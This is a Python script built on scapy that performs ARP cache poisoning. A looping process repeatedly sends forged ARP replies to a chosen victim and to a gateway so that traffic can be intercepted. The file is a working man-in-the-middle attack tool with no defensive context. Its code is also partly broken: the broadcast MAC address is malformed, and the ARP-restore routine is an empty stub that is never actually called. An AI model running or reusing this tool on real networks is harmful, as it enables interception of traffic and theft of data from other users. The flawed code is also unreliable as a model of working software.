#
"""

"""

import scapy.all as scapy
import sys
import time
from multiprocessing import Process

from logger import DataLogging
logger = DataLogging(True)

class ARP:
    def __init__(self):
        self.targetIP = None
        self.spoofWithIP = None

        return None


    # get the mac address for a device on IP ip
    def getMacAddress(self, ip):
        packet = scapy.Ether(dst='ff:ff:ff:ff')/scapy.ARP(op='who-has', pdst=ip)
        resp, _ = scapy.srp(packet, timeout=1, verbose=False)
        for _, r in resp:
            logger.log(f"our mac: {r[scapy.Ether].src}", 'ARPer')
            return r[scapy.Ether].src
        return None


    # spoof the ARP
    def ARP_poison(self, targetIP, spoofWithIP, loop):
        self.targetIP = targetIP
        self.spoofWithIP = spoofWithIP

        if loop:
            self.ARP_poisonThread = Process(target=self.ARP_poisoning_thread)
            self.ARP_poisonThread.start()


    def restoreOriginalARPs(self):

        return 1

    def ARP_poisoning_thread(self):

        packetsSent = 0
        while True:
            try:
                packetsSent = packetsSent + 2

                # to victim
                packet = scapy.ARP(op=2,
                                   pdst=self.targetIP,
                                   hwdst=self.getMacAddress(self.targetIP),
                                   psrc=self.spoofWithIP)
                scapy.send(packet, verbose=False)

                # to gateway
                packet = scapy.ARP(op=2,
                                   pdst=self.spoofWithIP,
                                   hwdst=self.getMacAddress(self.spoofWithIP),
                                   psrc=self.targetIP)
                scapy.send(packet, verbose=False)

            except KeyboardInterrupt:
                self.restoreOriginalARPs
                sys.exit()


            sys.stdout.write(f"{packetsSent} packets sent \n")
            sys.stdout.flush()
            time.sleep(5)